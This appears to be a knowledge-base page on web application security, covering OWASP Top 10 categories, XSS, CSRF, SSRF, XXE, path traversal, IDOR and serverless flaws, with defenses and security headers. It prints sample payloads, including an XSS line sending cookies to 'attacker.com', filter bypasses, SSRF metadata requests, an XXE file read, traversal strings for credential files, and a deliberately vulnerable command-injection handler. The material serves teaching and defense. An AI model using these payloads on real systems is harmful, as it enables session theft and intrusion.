---
title: Web Application Security Fundamentals
category: concepts
tags: [security, web, xss, csrf, ssrf, xxe, owasp, headers]
---

# Web Application Security Fundamentals

Core web application vulnerabilities and defenses: XSS (reflected, stored, DOM-based), CSRF, SSRF, XXE, path traversal, IDOR, and the OWASP Top 10. Covers both attack techniques and prevention patterns.

## Key Facts
- OWASP Top 10 (2021): #1 is Broken Access Control, not injection
- Stored XSS is more dangerous than reflected XSS - no social engineering needed
- Parameterized queries are the primary defense against SQL injection (see [[sql-injection-deep-dive]])
- IDOR is the most common access control vulnerability - always check authorization server-side
- CSP (Content Security Policy) is the strongest defense against XSS when properly configured

## OWASP Top 10 (2021)
1. **A01 Broken Access Control** - IDOR, privilege escalation
2. **A02 Cryptographic Failures** - weak encryption, exposed data
3. **A03 Injection** - SQLi, XSS, command injection
4. **A04 Insecure Design** - architectural flaws
5. **A05 Security Misconfiguration** - defaults, unnecessary features
6. **A06 Vulnerable Components** - outdated libraries
7. **A07 Authentication Failures** - broken auth, session management
8. **A08 Data Integrity Failures** - insecure deserialization, CI/CD
9. **A09 Logging/Monitoring Failures** - insufficient logging
10. **A10 SSRF** - server-side request forgery

## Cross-Site Scripting (XSS)

### Types
| Type | Storage | Trigger | Impact |
|------|---------|---------|--------|
| Reflected | Not stored | Victim clicks link | Single user |
| Stored | In database | Any user views content | All users |
| DOM-based | Client-side only | URL/input manipulation | Single user |

### Attack Examples
```html
<!-- Reflected XSS -->
https://example.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- Stored XSS in comment field -->
<img src=x onerror=alert(document.cookie)>

<!-- DOM-based XSS -->
<script>document.getElementById('output').innerHTML = location.hash.substring(1);</script>
```

### Filter Bypass Techniques
- Case variation: `<ScRiPt>alert(1)</ScRiPt>`
- Event handlers: `<img src=x onerror=alert(1)>`
- Encoding: `<script>alert(String.fromCharCode(88,83,83))</script>`
- Tag alternatives: `<svg onload=alert(1)>`, `<body onload=alert(1)>`

### XSS Prevention
- **Output encoding** per context (HTML entity, JavaScript, URL encoding)
- **CSP header**: `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com`
- **HttpOnly cookies** - prevent JS access to session cookies
- **DOMPurify** for HTML sanitization
- Never use `innerHTML` with untrusted data - use `textContent`

## CSRF (Cross-Site Request Forgery)
Force authenticated user to perform unintended actions:
```html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```
Prevention: CSRF tokens, SameSite cookies, Origin header validation.

## SSRF (Server-Side Request Forgery)
Make the server send requests to internal resources:
```text
POST /fetch?url=http://169.254.169.254/latest/meta-data/   # AWS metadata
POST /fetch?url=http://localhost:6379/                       # Internal Redis
POST /fetch?url=file:///etc/passwd                          # Local file read
```

## XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```
Prevention: disable external entity processing in XML parsers.

## Path Traversal
```text
http://target.com/file?name=../../../etc/passwd
http://target.com/file?name=..%2F..%2F..%2Fetc%2Fpasswd       # URL-encoded
http://target.com/file?name=%252e%252e%252f%252e%252e%252f     # Double-encoded
http://target.com/file?name=..\..\..\..\windows\system32\config\sam  # Windows
```

**High-value target files:** `/etc/passwd`, `/etc/shadow`, `~/.ssh/id_rsa`, `.env` files, application configs with DB credentials.

Prevention: chroot/jail, whitelist filenames, canonicalize paths, use framework file-serving utilities.

## IDOR (Insecure Direct Object Reference)
```text
GET /api/orders/1234    # Own order
GET /api/orders/1235    # Another user's order - no authorization check
```

Prevention:
- Authorization check on **every** access - verify requesting user owns the resource
- Use UUIDs instead of sequential IDs (makes enumeration harder, does NOT replace access control)
- Rate limiting to slow enumeration

## Security Assessment Methods
- **White-box** - full source code access, more thorough, time-consuming
- **Black-box** - no internal knowledge, simulates real attacker, may miss logic flaws
- **Gray-box** - partial knowledge (e.g., authenticated user perspective)

## Serverless-Specific Vulnerabilities

Serverless architectures (Lambda, Cloud Functions, Azure Functions) introduce unique attack surfaces:

### Event Injection
Serverless functions triggered by events (S3, SQS, API Gateway) can receive malicious payloads through the event source itself:
```python
# Vulnerable: event data directly used in command
def handler(event, context):
    filename = event['Records'][0]['s3']['object']['key']
    os.system(f"convert {filename} output.png")  # command injection via filename!

# Fix: validate and sanitize event data
import shlex
def handler(event, context):
    filename = event['Records'][0]['s3']['object']['key']
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError("Invalid filename")
    subprocess.run(["convert", filename, "output.png"])  # no shell=True
```

### Overprivileged IAM Roles
Each function should follow least privilege - a common mistake is sharing a single IAM role across all functions:
```yaml
# BAD: wildcard permissions
- Effect: Allow
  Action: "s3:*"
  Resource: "*"

# GOOD: scoped per function
- Effect: Allow
  Action: "s3:GetObject"
  Resource: "arn:aws:s3:::my-bucket/uploads/*"
```

### Cold Start Information Leakage
Environment variables persist between warm invocations. Sensitive data from a previous invocation may leak to the next one if stored in global scope.

## Security Headers Reference

```yaml
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none'
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

## Gotchas
- XSS in JSON API responses can still be exploited if the response is rendered in a browser context
- CSP `unsafe-inline` defeats the purpose of CSP for XSS protection
- SSRF blocklists for internal IPs can be bypassed with DNS rebinding, IPv6 mapped addresses, or URL parsing quirks
- Path traversal `../` stripping can be bypassed with `....//` (nested traversal)
- IDOR with UUIDs is still exploitable if UUIDs are leaked elsewhere (logs, URLs, responses)
- Serverless functions share the execution environment between warm invocations - global variables persist and can leak data between tenants
- Cloud metadata endpoints (169.254.169.254) are accessible from Lambda/Cloud Functions by default - use IMDSv2 (AWS) which requires session tokens
- Event-driven architectures expand the attack surface - every event source (S3, SQS, SNS, API Gateway) is a potential injection point

## See Also
- [[sql-injection-deep-dive]] - SQLi types, sqlmap, parameterized queries
- [[burp-suite-and-web-pentesting]] - intercepting proxy, scanner, intruder
- [[secure-backend-development]] - NestJS/Express security patterns
- [[authentication-and-authorization]] - session management, JWT
